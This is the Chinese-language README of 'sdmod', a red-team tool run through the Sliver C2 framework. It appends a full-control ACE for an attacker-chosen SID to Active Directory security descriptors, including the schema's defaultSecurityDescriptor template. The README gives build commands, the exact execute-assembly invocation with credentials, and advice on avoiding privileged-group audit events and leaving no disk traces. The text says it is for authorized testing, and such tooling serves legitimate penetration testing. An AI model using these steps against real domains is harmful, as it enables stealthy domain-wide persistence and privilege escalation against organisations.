# sdmod —— 安全描述符修改器

**语言**: [English](../README.md) | **中文** | [Français](README.fr.md)

<img align="right" src="../assets/sdmod.png" alt="sdmod Logo" width="280">

通过 LDAP 为 AD 对象安全描述符追加指定 SID 完全控制 ACE 的 C# 命令行工具，为红队场景打造，适配 Sliver C2 `execute-assembly --in-process`。

![Platform](https://img.shields.io/badge/platform-Windows-0078d6?style=flat) ![Language](https://img.shields.io/badge/language-C%23-68217a?style=flat) [![Version](https://img.shields.io/github/v/release/RedteamNotes/sdmod?style=flat&label=Version)](https://github.com/RedteamNotes/sdmod/releases/latest) [![License](https://img.shields.io/github/license/RedteamNotes/sdmod?style=flat)](../LICENSE) [![Security Policy](https://img.shields.io/badge/security%20policy-2ea44f?style=flat)](../SECURITY.md)

面向实战：绑定采用 `Secure | ServerBind`，强制直连指定域控、跳过 DC 自动选址，确保架构分区写入可靠命中 Schema Master FSMO 角色。安全描述符以其原生 SDDL 字符串形式读写，由域控自行解析转换，无二进制转换、无"服务器不愿意处理请求"类兼容问题。ACE 采用追加而非替换：完整保留原有所有 ACE（含架构分区特有的对象型 OA、隐含所有者与主组）。

仅依赖 `System.DirectoryServices`，Mono 编译为约 4-6 KB 的 x64 程序集，无第三方依赖——体积小、依赖少、便于进程内加载。仅用于授权红队、渗透测试与实验室环境。

<br clear="right">

## 功能

| 项 | 说明 |
|---|---|
| 读取 | 以 SDDL 字符串形式读取目标对象安全描述符，强制刷新属性缓存，使用最新值 |
| 追加 | 为指定 SID 追加一条完全控制允许 ACE（与 Domain Admins 相同权限）——append-only，不触碰任何原有 ACE |
| 写回 | 直接提交更新后的 SDDL 字符串，由域控原生解析转换，格式兼容性最高 |
| 绑定 | `Secure \| ServerBind`——LDAP 签名 + 强制直连指定服务器，绕过 DC 自动选址 |
| 零依赖 | 仅 `System.DirectoryServices`；Mono 兼容，约 4-6 KB x64 程序集，无第三方库 |

## 编译

需要 Mono（`mcs`）或 .NET Framework 4.x。先获取源码，再在 Debian / Kali 上安装编译依赖：

```bash
# 获取源码（单文件）
curl -O https://raw.githubusercontent.com/RedteamNotes/sdmod/main/sdmod.cs

# 安装编译依赖（Debian / Kali）
sudo apt update
sudo apt install -y mono-mcs mono-devel

# 编译
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll -platform:x64 -debug-
```

无第三方依赖。Release 不附带预编译二进制，需用上述命令自行编译（尽量减少供应链暴露）。参数说明：`-platform:x64` 强制 x64 目标以匹配 Sliver beacon 架构；`-debug-` 不生成 .mdb 调试符号文件。`-optimize` 与 `-nologo` 对如此小的工具几乎无影响——`-nologo` 只是关闭编译 banner，与产物无关。

## 用法

```text
sdmod.exe <LDAP Path> <User> <Pass> <AttrName> <TrusteeSID>
```

### 参数

| # | 参数 | 说明 |
|---|---|---|
| 1 | `<LDAP Path>` | LDAP 对象路径，如 `LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local` |
| 2 | `<User>` | 认证用户名，`domain\user` |
| 3 | `<Pass>` | 密码 |
| 4 | `<AttrName>` | 目标属性名，如 `defaultSecurityDescriptor` |
| 5 | `<TrusteeSID>` | 被授予完全控制权限的 SID（直接传 SID，无需名称解析） |

### 退出码

| 码 | 含义 |
|---|---|
| 0 | 成功 |
| 1 | 用法 / 参数错误 |
| 2 | 属性类型异常 |
| 3 | LDAP / AD 操作失败（细节见 stderr） |

## 示例

先查询当前值，记录原始 SDDL 以便回滚：

```text
sliver > sa-ldapsearch -- -query "(name=Group)" -dn "CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes defaultSecurityDescriptor
```

为目标 SID 追加完全控制 ACE：

```text
sliver > execute-assembly --in-process sdmod.exe -- \
  "LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" \
  "redteamnotes\redpen" "P@ssw0rd" "defaultSecurityDescriptor" "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx"

[+] Success: ACE added successfully
```

再次执行查询验证——SDDL 字符串末尾会多出这条 ACE。

完整端到端实战（含完整流程示例）见 [TUTORIAL](TUTORIAL.zh-CN.md)。

## 注意

- 写入后需等待约 3-5 分钟权限才生效，过早操作会失败；
- 修改的是架构分区 `defaultSecurityDescriptor`（模板），而非组成员关系——已有对象不受影响，之后创建的对象会继承该 ACE；
- 修改前务必记录原始 SDDL，以便回滚；
- 重复运行会重复追加同一条 ACE（SDDL 末尾逐次累积），需要时用记录的原始值还原；
- 密码以明文出现在命令行（进程列表 / `execute-assembly` 参数可见），接受该暴露面或改用已持凭据的上下文；
- 仅用于授权测试环境。

## 检测面

该改动在防守方视角的呈现，以及如何控制痕迹。

- 被修改的 `defaultSecurityDescriptor` 随架构分区复制，查询对象即可看到追加的 ACE 及其硬编码 SID；
- 若启用 DS 访问审计，接收写入的域控会记录目录服务属性修改事件（Event 5136）；
- 由于不触碰任何组成员关系，不会触发常规的特权组监控（Event 4728/4732）。

### 降低痕迹

- 优先采用架构模板修改而非直接改组成员——不产生任何 `Member` 变更；
- 演练结束时记录并还原原始 SDDL。

## 通过 Sliver `execute-assembly` 使用

主要部署路径——进程内执行，无落盘痕迹：

```text
sliver > make-token -d redteamnotes.local -u redpen -p 'P@ssw0rd'
sliver > execute-assembly --in-process sdmod.exe -- ...
```

`make-token` 默认使用 `LOGON32_LOGON_NEW_CREDENTIALS`：本地操作仍以原进程身份执行，仅出站网络连接携带新凭证。

## 许可证

sdmod 采用 MIT License 发布。

## 免责声明

仅用于授权安全评估、CTF 与实验室环境。作者不对滥用负责。
